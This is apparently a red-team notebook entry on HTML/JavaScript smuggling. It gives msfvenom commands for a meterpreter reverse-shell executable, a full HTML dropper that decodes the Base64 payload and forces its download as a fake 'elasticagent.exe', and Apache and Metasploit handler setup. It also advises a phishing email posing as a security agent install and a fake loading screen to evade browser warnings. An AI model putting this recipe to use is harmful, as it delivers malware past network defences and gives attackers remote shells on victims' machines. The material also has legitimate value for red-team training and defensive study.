
> [!abstract] HTML/JS Payload Smuggling (Initial Access & Delivery)
> This technique uses an HTML file containing embedded JavaScript to deliver a malicious executable. The EXE payload is Base64 encoded and hidden inside the HTML source code. When the victim opens the HTML page, the JavaScript automatically decodes the Base64 string, constructs a `Blob` (Binary Large Object), and forces the victim's browser to download it as an executable file.
> **MITRE ATT&CK Mapping:** [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) | [T1204.002 - User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/) | [T1059.007 - JavaScript](https://attack.mitre.org/techniques/T1059/007/)

## How It Works

> [!info] Why use HTML/JS Smuggling?
> Many enterprise firewalls and proxy servers block the direct download of `.exe` files based on file signatures or MIME types. By encoding the executable into Base64 and embedding it in an HTML file, the network only sees standard web traffic (text/HTML). The malicious binary is only reconstructed on the victim's endpoint, effectively bypassing network-level defenses.

---

## Step 1: Generate & Encode Payload

> [!example]+ Creating the Base64 Executable
> First, generate a standard reverse shell executable using `msfvenom`. Then, convert the raw binary into a continuous Base64 string.
> 
> ```bash
> # 1. Generate the EXE payload
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o file.exe
> 
> # 2. Encode the EXE to a continuous Base64 string (-w0 removes line breaks)
> base64 -w0 file.exe > file.txt
> ```
> *Copy the entire Base64 string from `file.txt`. You will need it for the HTML file.*

---

## Step 2: Create the HTML Dropper

> [!tip]+ Crafting the HTML Smuggler
> Create an HTML file in your Apache web directory. Paste the Base64 string you copied in Step 1 into the `var file = ''` variable.
> *Note: Corrected path from `/var/log/www` to `/var/www/html`.*
> 
> ```bash
> nano /var/www/html/file.html
> ```
> 
> **HTML/JS Code:**
> ```html
> <html>
> <body>
> 	<script>
> 	function base64ToArrayBuffer(base64){
> 		var binary_string = window.atob(base64);
> 		var len = binary_string.length;
> 		var bytes = new Uint8Array( len );
> 		for (var i = 0; i < len; i++){
> 			bytes[i] = binary_string.charCodeAt(i);
> 		}
> 		return bytes.buffer;
> 	}
> 	
> 	// PASTE YOUR BASE64 STRING INSIDE THE QUOTES
> 	var file = 'PASTE_BASE64_STRING_HERE';
> 	var data = base64ToArrayBuffer(file);
> 	var blob = new Blob([data], {type: 'octet/stream'});
> 	
> 	// Name of the file the victim will see
> 	var fileName = 'elasticagent.exe'; 
> 	var a = document.createElement('a');
> 	document.body.appendChild(a);
> 	a.style = 'display: none';
> 	var url = window.URL.createObjectURL(blob);
> 	a.href = url;
> 	a.download = fileName;
> 	a.click();
> 	window.URL.revokeObjectURL(url);
> 	</script>
> </body>
> </html>
> ```

---

## Step 3: Host & Catch the Shell

> [!danger]+ Setting up the Web Server & Listener
> Start Apache to host the HTML file, and start a Metasploit handler to catch the reverse shell when the victim executes the downloaded file.
> 
> **1. Start Apache:**
> ```bash
> sudo systemctl start apache2
> ```
> 
> **2. Start Metasploit Listener:**
> ```bash
> msfconsole -qx 'use exploit/multi/handler; set LHOST x.x.x.x; set LPORT 4444; set payload windows/meterpreter/reverse_tcp; run'
> ```

---

> [!warning] OPSEC & Delivery Notes
> - **Execution:** This HTML file only *downloads* the executable automatically. It does not execute it. The victim still needs to click "Keep" or "Run" in their browser's download bar.
> - **Social Engineering:** The filename `elasticagent.exe` is chosen to mimic legitimate software (Elastic Agent). Pair this with a phishing email that says "Please install the new endpoint security agent" to trick the user into running it.
> - **Antivirus:** Modern browsers might flag the automatic download as suspicious. You can add a fake "Loading..." screen or a button that says "Download Agent" which the user must click to trigger the JavaScript function, making it look more natural.

